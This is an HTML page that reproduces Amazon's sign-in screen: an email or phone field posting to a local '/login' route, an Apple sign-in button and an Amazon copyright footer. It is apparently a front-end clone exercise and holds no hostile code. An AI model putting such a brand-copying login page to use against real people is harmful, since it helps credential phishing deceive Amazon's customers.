<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
    <title>Amazon Sign In</title>
  </head>
  <body class="signin-body">
    
    <div class="signin-logo">
      <a href="index.html">
        <div class="logo"></div>
      </a>
    </div>

    <div class="signin-box">
      <h1>Sign in</h1>

      <form action="/login" method="POST">
        <label for="email_phone">Email or mobile phone number</label>
        <input type="text" id="email_phone" name="email_phone" required />

        <button class="a-button a-button-primary" type="submit">Continue</button>
      </form>

      <p class="terms">
        By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
      </p>

      <div class="need-help">
        <a href="#"><i class="fa-solid fa-caret-right"></i> Need help?</a>
      </div>
      
      <div class="apple-signin-section">
        <button class="a-button a-button-apple">
          <i class="fa-brands fa-apple"></i> Sign in with Apple ID
        </button>
      </div>

    </div>
    
    <div class="divider">
      <h5><span>New to Amazon?</span></h5>
    </div>
    
    <button class="a-button a-button-secondary create-account-btn">
      Create your Amazon account
    </button>
    

    <div class="signin-footer">
      <div class="signin-footer-links">
        <a href="#">Conditions of Use</a>
        <a href="#">Privacy Notice</a>
        <a href="#">Help</a>
      </div>
      <p class="copyright">© 1996-2023, Amazon.com, Inc. or its affiliates</p>
    </div>
    
    </body>
</html>
